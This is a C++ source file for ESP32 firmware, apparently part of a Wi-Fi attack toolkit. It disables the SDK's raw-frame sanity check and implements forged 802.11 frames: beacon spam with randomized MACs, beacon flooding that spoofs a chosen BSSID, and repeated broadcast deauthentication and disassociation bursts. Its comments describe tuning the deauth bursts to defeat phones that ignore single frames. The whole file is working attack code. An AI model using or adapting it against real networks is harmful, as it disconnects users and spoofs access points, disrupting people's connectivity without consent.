#include "utils/network/WifiAttackUtil.h"
#include <esp_wifi.h>

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337) return 1;
  return 0;
}

WifiAttackUtil::WifiAttackUtil(bool initAP)
{
  WiFi.mode(WIFI_MODE_APSTA);
  if (initAP) {
    WiFi.softAP("No Internet", "12345678", 1, true);
  }
}

WifiAttackUtil::~WifiAttackUtil()
{
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true, true);
  WiFi.mode(WIFI_OFF);
  _sequenceNumber = 0;
}

esp_err_t WifiAttackUtil::setChannel(uint8_t channel)
{
  return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

esp_err_t WifiAttackUtil::_changeChannel(const uint8_t channel) noexcept
{
  if (channel == _currentChannel) return ESP_OK;
  _currentChannel = channel;
  return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

esp_err_t WifiAttackUtil::_sendPacket(const uint8_t* packet, const size_t len) noexcept
{
  return esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false);
}

esp_err_t WifiAttackUtil::deauthenticate(const MacAddr bssid, const uint8_t channel)
{
  const MacAddr broadcast = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  return deauthenticate(broadcast, bssid, channel);
}

esp_err_t WifiAttackUtil::beaconSpam(const char* ssid, const uint8_t channel)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  const size_t ssidLen = strnlen(ssid, 32);

  // Randomize MAC — force unicast (bit 0 = 0) + locally administered (bit 1 = 1)
  uint8_t mac[6];
  for (int j = 0; j < 6; j++) mac[j] = (uint8_t)random(0, 256);
  mac[0] = (mac[0] & 0xFE) | 0x02;

  // Build beacon frame dynamically so SSID IE length matches actual SSID length
  // and all subsequent IE offsets are correct regardless of SSID length.
  uint8_t pkt[109];  // sized for max SSID (32 bytes)
  size_t  n = 0;

  // MAC header
  pkt[n++] = 0x80; pkt[n++] = 0x00;                    // Frame Control: beacon
  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Duration
  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;  // DA: broadcast
  memcpy(&pkt[n], mac, 6); n += 6;                      // SA
  memcpy(&pkt[n], mac, 6); n += 6;                      // BSSID
  const size_t seqOff = n;
  pkt[n++] = 0x00; pkt[n++] = 0x00;                    // Sequence Control (per send)

  // Fixed parameters
  memset(&pkt[n], 0, 8); n += 8;                        // Timestamp: 0
  pkt[n++] = 0xE8; pkt[n++] = 0x03;                    // Beacon interval
  pkt[n++] = 0x31; pkt[n++] = 0x00;                    // Capability

  // SSID IE — length = actual SSID byte count
  pkt[n++] = 0x00;
  pkt[n++] = (uint8_t)ssidLen;
  memcpy(&pkt[n], ssid, ssidLen); n += ssidLen;

  // Supported Rates IE
  pkt[n++] = 0x01; pkt[n++] = 0x08;
  pkt[n++] = 0x82; pkt[n++] = 0x84; pkt[n++] = 0x8B; pkt[n++] = 0x96;
  pkt[n++] = 0x24; pkt[n++] = 0x30; pkt[n++] = 0x48; pkt[n++] = 0x6C;

  // DS Parameter Set IE
  pkt[n++] = 0x03; pkt[n++] = 0x01; pkt[n++] = channel;

  // RSN IE
  pkt[n++] = 0x30; pkt[n++] = 0x18;
  pkt[n++] = 0x01; pkt[n++] = 0x00;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
  pkt[n++] = 0x02; pkt[n++] = 0x00;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
  pkt[n++] = 0x01; pkt[n++] = 0x00;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
  pkt[n++] = 0x00; pkt[n++] = 0x00;

  for (int k = 0; k < 3; k++) {
    uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
    pkt[seqOff]     = (uint8_t)(sc & 0xFF);
    pkt[seqOff + 1] = (uint8_t)(sc >> 8);
    _sequenceNumber++;
    _sendPacket(pkt, n);
    vTaskDelay(1 / portTICK_RATE_MS);
  }

  return ESP_OK;
}

esp_err_t WifiAttackUtil::beaconFlood(const uint8_t* bssid, const char* ssid, const uint8_t channel)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  const size_t ssidLen = strnlen(ssid, 32);

  uint8_t pkt[109];
  size_t  n = 0;

  pkt[n++] = 0x80; pkt[n++] = 0x00;
  pkt[n++] = 0x00; pkt[n++] = 0x00;
  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
  memcpy(&pkt[n], bssid, 6); n += 6;
  memcpy(&pkt[n], bssid, 6); n += 6;
  const size_t seqOff = n;
  pkt[n++] = 0x00; pkt[n++] = 0x00;

  memset(&pkt[n], 0, 8); n += 8;
  pkt[n++] = 0xE8; pkt[n++] = 0x03;
  pkt[n++] = 0x31; pkt[n++] = 0x00;

  pkt[n++] = 0x00;
  pkt[n++] = (uint8_t)ssidLen;
  memcpy(&pkt[n], ssid, ssidLen); n += ssidLen;

  pkt[n++] = 0x01; pkt[n++] = 0x08;
  pkt[n++] = 0x82; pkt[n++] = 0x84; pkt[n++] = 0x8B; pkt[n++] = 0x96;
  pkt[n++] = 0x24; pkt[n++] = 0x30; pkt[n++] = 0x48; pkt[n++] = 0x6C;

  pkt[n++] = 0x03; pkt[n++] = 0x01; pkt[n++] = channel;

  pkt[n++] = 0x30; pkt[n++] = 0x18;
  pkt[n++] = 0x01; pkt[n++] = 0x00;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
  pkt[n++] = 0x02; pkt[n++] = 0x00;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
  pkt[n++] = 0x01; pkt[n++] = 0x00;
  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
  pkt[n++] = 0x00; pkt[n++] = 0x00;

  uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
  pkt[seqOff]     = (uint8_t)(sc & 0xFF);
  pkt[seqOff + 1] = (uint8_t)(sc >> 8);
  _sequenceNumber++;
  return _sendPacket(pkt, n);
}

esp_err_t WifiAttackUtil::deauthenticate(const MacAddr ap, const MacAddr bssid, const uint8_t channel)
{
  esp_err_t res = _changeChannel(channel);
  if (res != ESP_OK) return res;

  memcpy(_deauthFrame, _deauthDefault, sizeof(_deauthDefault));
  memcpy(&_deauthFrame[4],  ap,    6);
  memcpy(&_deauthFrame[10], bssid, 6);
  memcpy(&_deauthFrame[16], bssid, 6);

  // Send multiple deauth + disassoc frames for effectiveness
  // Some devices (especially phones) ignore single broadcast deauth
  for (int i = 0; i < 3; i++) {
    memcpy(&_deauthFrame[22], &_sequenceNumber, 2);
    _sequenceNumber++;
    _deauthFrame[0] = 0xc0;  // deauth
    _sendPacket(_deauthFrame, sizeof(_deauthFrame));
    _deauthFrame[0] = 0xa0;  // disassoc
    _sendPacket(_deauthFrame, sizeof(_deauthFrame));
    vTaskDelay(1 / portTICK_PERIOD_MS);
  }

  return ESP_OK;
}